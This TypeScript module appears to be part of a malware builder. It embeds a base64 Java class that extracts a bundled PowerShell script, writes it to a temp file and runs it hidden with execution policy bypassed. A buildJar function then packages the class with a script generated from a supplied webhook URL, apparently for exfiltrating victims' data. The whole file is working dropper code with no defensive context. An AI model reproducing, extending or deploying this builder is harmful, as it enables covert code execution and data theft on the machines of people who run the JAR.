// Main.class: reads /payload.ps1 from JAR, drops to temp, runs with PowerShell hidden
// Compiled from Main.java with javac 21 (class file version 65/Java 21)
const MAIN_CLASS_B64 =
  "yv66vgAAAEEAYQoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+" +
  "AQADKClWBwAIAQAETWFpbggACgEADC9wYXlsb2FkLnBzMQoADAANBwAODAAPABABAA9q" +
  "YXZhL2xhbmcvQ2xhc3MBABNnZXRSZXNvdXJjZUFzU3RyZWFtAQApKExqYXZhL2xhbmcv" +
  "U3RyaW5nOylMamF2YS9pby9JbnB1dFN0cmVhbTsIABIBAAN1cGQIABQBAAQucHMxCgAW" +
  "ABcHABgMABkAGgEADGphdmEvaW8vRmlsZQEADmNyZWF0ZVRlbXBGaWxlAQA0KExqYXZh" +
  "L2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9pby9GaWxlOwcAHAEA" +
  "GGphdmEvaW8vRmlsZU91dHB1dFN0cmVhbQoAGwAeDAAFAB8BABEoTGphdmEvaW8vRmlsZTsp" +
  "VgoAIQAiBwAjDAAkACUBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAEcmVhZAEABShbQilJCgAb" +
  "ACcMACgAKQEABXdyaXRlAQAHKFtCSUkpVgoAGwArDAAsAAYBAAVjbG9zZQcALgEAE2phdmEv" +
  "bGFuZy9FeGNlcHRpb24HADABABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHADIBABBqYXZh" +
  "L2xhbmcvU3RyaW5nCAA0AQAKcG93ZXJzaGVsbAgANgEADC1XaW5kb3dTdHlsZQgAOAEABkhi" +
  "ZGRlbggAOgEAEC1FeGVjdXRpb25Qb2xpY3kIADwBAAZCeXBhc3MIAD4BAAUtRmlsZQoAFgBA" +
  "DABBAEIBAA9nZXRBYnNvbHV0ZVBhdGgBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwoALwBEDAAF" +
  "AEUBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWCgAvAEcMAEgASQEABXN0YXJ0AQAVKClMamF2" +
  "YS9sYW5nL1Byb2Nlc3M7CgBLAEwHAE0MAE4ATwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAHd2Fp" +
  "dEZvcgEAAygpSQoAFgBRDABSAFMBAAZkZWxldGUBAAMoKVoBAARDb2RlAQAPTGluZU51bWJlcl" +
  "RhYmxlAQAEbWFpbgEADVN0YWNrTWFwVGFibGUHAFkBAAJbQgcAWwEAE1tMamF2YS9sYW5nL1N0" +
  "cmluZzsHAF0BABNqYXZhL2xhbmcvVGhyb3dhYmxlAQAKRXhjZXB0aW9ucwEAClNvdXJjZUZpbGUB" +
  "AAlNYWluLmphdmEAIQAHAAIAAAAAAAIAAQAFAAYAAQBUAAAAHQABAAEAAAAFKrcAAbEAAAABAFUAAAAG" +
  "AAEAAAADAAkAVgBFAAIAVAAAASgABgAHAAAAkxIHEgm2AAtMK8cABLESERITuAAVTbsAG1kstwAdTh" +
  "EgALwIOgQrGQS2ACBZNgUCnwAPLRkEAxUFtgAmp//qLbYAKqcABU6xuwAvWRAHvQAxWQMSM1NZBBI1" +
  "U1kFEjdTWQYSOVNZBxI7U1kIEj1TWRAGLLYAP1O3AEO2AEa2AEpXLLYAUFenAA06Biy2AFBXGQa/" +
  "sQADABUAQgBFAC0ARwCAAIgAAACIAIoAiAAAAAIAVQAAADIADAAAAAUACAAGAA0ABwAVAAkAHgAKACUA" +
  "DAA+AA0AQgAOAEcAEAB5ABEAgAASAJIAEwBXAAAAMwAH/AANBwAh/gAXBwAWBwAbBwBY/AAYAf8ABgAD" +
  "BwBaBwAhBwAWAAEHAC0B9wBABwBcCQBeAAAABAABAC0AAQBfAAAAAgBg";

import { buildPs1 } from "./ps1.js";
import { createRequire } from "module";
const require = createRequire(import.meta.url);

export async function buildJar(webhook: string): Promise<Buffer> {
  const JSZip = require("jszip");
  const zip = new JSZip();

  const ps1 = buildPs1(webhook);
  const manifest = "Manifest-Version: 1.0\r\nMain-Class: Main\r\n\r\n";

  zip.file("META-INF/MANIFEST.MF", manifest, { compression: "STORE" });
  zip.file("Main.class", Buffer.from(MAIN_CLASS_B64, "base64"), { compression: "DEFLATE" });
  zip.file("payload.ps1", ps1, { compression: "DEFLATE" });

  return await zip.generateAsync({ type: "nodebuffer" });
}
